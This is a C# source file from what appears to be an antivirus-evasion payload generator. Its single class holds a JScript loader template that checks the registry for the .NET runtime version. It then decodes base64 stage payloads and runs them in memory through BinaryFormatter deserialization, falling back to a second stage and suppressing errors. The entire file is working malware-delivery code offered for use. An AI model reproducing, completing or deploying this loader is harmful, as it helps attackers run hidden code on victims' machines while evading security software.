using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace 掩日___免杀执行器生成工具
{
    class TP_JS
    {
        string code;

        public TP_JS()
        {
            code = @"function Base64ToStream(b,l) {
	var enc = new ActiveXObject(""System.Text.ASCIIEncoding"");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject(""System.Security.Cryptography.FromBase64Transform"");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject(""System.IO.MemoryStream"");
	ms.Write(ba, 0, l);
	ms.Position = 0;
	return ms;
}

var stage_1 = ""%_STAGE1_%"";
var stage_2 = ""%_STAGE2_%"";

try {

	var shell = new ActiveXObject('WScript.Shell');
	ver = 'v4.0.30319';

	try {
		shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
	} catch(e) { 
		ver = 'v2.0.50727';
	}

	shell.Environment('Process')('COMPLUS_Version') = ver;

	var ms_1 = Base64ToStream(stage_1, %_STAGE1Len_%);
	var fmt_1 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	fmt_1.Deserialize_2(ms_1);
	
} catch (e) {
	try{		
		var ms_2 = Base64ToStream(stage_2, %_STAGE2Len_%);
		var fmt_2 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
		fmt_2.Deserialize_2(ms_2);

	}catch (e2){}
}
";
        }
        public String GetCode()
        {
            return code;
        }
    }
}
